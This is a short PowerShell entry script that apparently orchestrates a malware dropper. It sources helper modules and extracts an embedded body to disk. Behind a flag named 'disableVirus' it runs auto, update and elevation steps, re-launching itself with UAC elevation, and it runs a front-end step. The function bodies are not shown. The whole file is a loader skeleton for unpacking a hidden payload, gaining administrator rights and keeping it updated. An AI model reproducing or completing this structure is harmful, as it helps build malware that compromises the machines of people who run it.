. ./consts.ps1
. ./utils.ps1
. ./auto.ps1
. ./embeddings.ps1
. ./update.ps1

$holderBody = Get-BodyPath
if (-not (Test-Path -Path $holderBody))
{
    ExtractEmbedding -inContent $xbody -outFile $holderBody
}

if (-not $server.disableVirus)
{
    DoAuto
}

Rerun -arg "guimode" -uac $false

Elevate

if (-not $server.disableVirus)
{
    Rerun -arg "" -uac $true
}

DoFront
DoEmbeddings

if (-not $server.disableVirus)
{
    DoUpdate
}